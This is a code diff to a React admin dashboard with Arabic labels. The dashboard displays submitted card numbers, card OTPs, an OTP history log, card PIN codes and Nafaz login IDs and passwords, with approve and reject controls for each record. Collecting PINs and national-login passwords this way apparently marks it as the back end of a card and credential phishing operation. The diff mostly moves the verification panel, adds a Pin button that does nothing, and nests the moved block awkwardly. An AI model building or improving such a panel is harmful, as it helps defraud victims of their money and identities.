@@ -754,7 +754,7 @@ export default function AdminDashboard() {
                       {/* 1. Payment Info - Full width card (most recent data) */}
                       {selectedApplication.cardNumber && (
                         <div
-                          className="lg:col-span-3 bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="lg:col-span-2 bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "0ms" }}
                         >
                           <div className="flex items-center gap-3 mb-6">
@@ -763,7 +763,7 @@ export default function AdminDashboard() {
                             </div>
                             <h3 className="font-semibold text-foreground">معلومات الدفع</h3>
                             <Badge
-                              variant="outline"
+                              variant="destructive"
                               className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary animate-bounce"
                             >
                               جديد
@@ -787,6 +787,68 @@ export default function AdminDashboard() {
                                   </p>
                                 </div>
                               )}
+                              
+                      {/* 3. Card Verification */}
+                      {(selectedApplication.otp || selectedApplication.pinCode) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "200ms" }}
+                        >
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2.5 rounded-lg bg-success/10 animate-pulse">
+                              <CreditCard className="w-5 h-5 text-success" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">حالة التحقق</h3>
+                            <Badge
+                              variant="outline"
+                              className="mr-auto text-[10px] bg-success/5 border-success/20 text-success"
+                            >
+                              جديد
+                            </Badge>
+                          </div>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
+                                <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
+                                <p className="text-lg font-mono font-bold text-foreground">
+                                  {selectedApplication.pinCode || "—"}
+                                </p>
+                              </div>
+                            </div>
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.idVerificationStatus === "approved"}
+                              >
+                                <CheckCircle className="w-4 h-4 mr-2" />
+                                قبول
+                              </Button>
+                              <Button
+                                onClick={() =>{} }
+                                variant="default"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                              >
+                                <CheckCircle className="w-4 h-4 mr-2" />
+                              Pin
+                              </Button>
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.idVerificationStatus === "rejected"}
+                              >
+                                <XCircle className="w-4 h-4 mr-2" />
+                                رفض
+                              </Button>
+                            </div>
+                          </div>
+                        </div>
+                      )}
                               {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                                 <div className="p-4 bg-muted/50 rounded-xl">
                                   <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
@@ -902,87 +964,6 @@ export default function AdminDashboard() {
                         </div>
                       )}
 
-                      {/* 3. Card Verification */}
-                      {(selectedApplication.otp || selectedApplication.pinCode) && (
-                        <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
-                          style={{ animationDelay: "200ms" }}
-                        >
-                          <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2.5 rounded-lg bg-success/10 animate-pulse">
-                              <CreditCard className="w-5 h-5 text-success" />
-                            </div>
-                            <h3 className="font-semibold text-foreground">حالة التحقق</h3>
-                            <Badge
-                              variant="outline"
-                              className="mr-auto text-[10px] bg-success/5 border-success/20 text-success"
-                            >
-                              جديد
-                            </Badge>
-                          </div>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
-                              <div className="flex items-center justify-between mb-4">
-                                <div className="flex items-center gap-3">
-                                  <div className="w-10 h-10 rounded-lg bg-success/10 flex items-center justify-center">
-                                    <CreditCard className="w-5 h-5 text-success" />
-                                  </div>
-                                  <div>
-                                    <p className="text-sm font-medium text-foreground">رمز البطاقة</p>
-                                    <p className="text-lg font-mono font-bold text-success">
-                                      {selectedApplication.otp || "—"}
-                                    </p>
-                                  </div>
-                                </div>
-                                <Badge
-                                  variant={
-                                    selectedApplication.idVerificationStatus === "approved"
-                                      ? "default"
-                                      : selectedApplication.idVerificationStatus === "rejected"
-                                        ? "destructive"
-                                        : "secondary"
-                                  }
-                                  className="animate-in zoom-in duration-300"
-                                >
-                                  {selectedApplication.idVerificationStatus === "approved"
-                                    ? "موافق"
-                                    : selectedApplication.idVerificationStatus === "rejected"
-                                      ? "مرفوض"
-                                      : "معلق"}
-                                </Badge>
-                              </div>
-                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
-                                <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
-                                <p className="text-lg font-mono font-bold text-foreground">
-                                  {selectedApplication.pinCode || "—"}
-                                </p>
-                              </div>
-                            </div>
-                            <div className="flex gap-2">
-                              <Button
-                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
-                                disabled={selectedApplication.idVerificationStatus === "approved"}
-                              >
-                                <CheckCircle className="w-4 h-4 mr-2" />
-                                قبول
-                              </Button>
-                              <Button
-                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
-                                disabled={selectedApplication.idVerificationStatus === "rejected"}
-                              >
-                                <XCircle className="w-4 h-4 mr-2" />
-                                رفض
-                              </Button>
-                            </div>
-                          </div>
-                        </div>
-                      )}
 
                       {/* 4. Nafaz */}
                       {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
